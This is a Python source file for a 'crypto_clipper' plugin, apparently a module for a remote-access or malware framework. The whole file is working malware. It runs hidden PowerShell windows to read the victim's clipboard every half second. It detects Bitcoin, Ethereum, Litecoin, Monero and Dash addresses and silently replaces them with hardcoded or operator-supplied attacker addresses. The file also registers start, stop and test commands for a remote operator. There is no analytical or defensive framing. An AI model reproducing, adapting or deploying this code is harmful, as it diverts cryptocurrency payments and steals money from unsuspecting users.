PLUGIN = {"name": "crypto_clipper", "desc": "Monitor clipboard for crypto addresses and replace them", "deps": [], "size": 2.5}

STUB_CODE = r"""
import re, hashlib

_CREATE_NO_WINDOW = 0x08000000

_REPLACEMENTS = {
    "btc": r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b",
    "eth": r"\b0x[a-fA-F0-9]{40}\b",
    "ltc": r"\b[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}\b",
    "xmr": r"\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b",
    "dash": r"\bX[1-9A-HJ-NP-Za-km-z]{33}\b",
}

_REPLACE_ADDRS = {
    "btc": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    "eth": "0x742d35Cc6634C0532925a3b844Bc454e4438f44",
    "ltc": "LVg2k9fVxSfKJjPqMD9P8kE7GpX9yGZR9j",
    "xmr": "4AdUndXHZ6B1hUv7RJE3qVx9Q3oXj8Y8K3GPqL5qkGzQYx6HkL9F8xW5Q4nPc2vR7mWXa3sZ9jK8nM2bV1cR4tY7uP",
    "dash": "Xx4Q8g7Jf3Kp9Lm2Nv5Rw8Yb1Cs4Dg6Hj",
}

_clipper_run = [False]

def _clip_get():
    try:
        out = subprocess.check_output(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
        return out.decode("utf-8", errors="replace").strip("\r\n ") or None
    except: return None

def _clip_set(text):
    try:
        safe = text.replace('"', '`"')
        subprocess.run(["powershell", "-NoProfile", "-Command", f'Set-Clipboard -Value "{safe}"'],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
    except: pass

def _replace_addresses(text, overrides=None):
    replaced = text
    found = []
    for coin, pattern in _REPLACEMENTS.items():
        rep = _REPLACE_ADDRS[coin]
        if overrides and coin in overrides: rep = overrides[coin]
        for match in re.finditer(pattern, replaced):
            addr = match.group()
            if addr != rep:
                found.append({"coin": coin, "original": addr, "replacement": rep})
                replaced = replaced.replace(addr, rep, 1)
    return replaced, found

def _clipper_thread(overrides):
    while _clipper_run[0]:
        try:
            text = _clip_get()
            if text:
                new_text, found = _replace_addresses(text, overrides)
                if found and new_text != text:
                    _clip_set(new_text)
        except: pass
        time.sleep(0.5)

def _cmd_clipper_start(m):
    try:
        if _clipper_run[0]: return {"output": "[!] Clipper already running"}
        _clipper_run[0] = True
        overrides = {}
        for coin in _REPLACEMENTS:
            if coin in m: overrides[coin] = m[coin]
        threading.Thread(target=_clipper_thread, args=(overrides,), daemon=True).start()
        return {"output": "[+] Crypto clipper started - monitoring clipboard"}
    except Exception as e: return {"output": f"[!] Clipper error: {e}"}

def _cmd_clipper_stop(m):
    _clipper_run[0] = False; return {"output": "[+] Crypto clipper stopped"}

def _cmd_clipper_test(m):
    try:
        text = m.get("text", "Send BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        new_text, found = _replace_addresses(text)
        out = f"[+] Test: {len(found)} addresses would be replaced\n"
        for f in found:
            out += f"  [{f['coin']}] {f['original']} -> {f['replacement']}\n"
        return {"output": out}
    except Exception as e: return {"output": f"[!] Clipper test error: {e}"}

_CMDS["clipper_start"] = _cmd_clipper_start
_CMDS["clipper_stop"] = _cmd_clipper_stop
_CMDS["clipper_test"] = _cmd_clipper_test
"""

def get_commands():
    return {"clipper_start": "_cmd_clipper_start", "clipper_stop": "_cmd_clipper_stop", "clipper_test": "_cmd_clipper_test"}
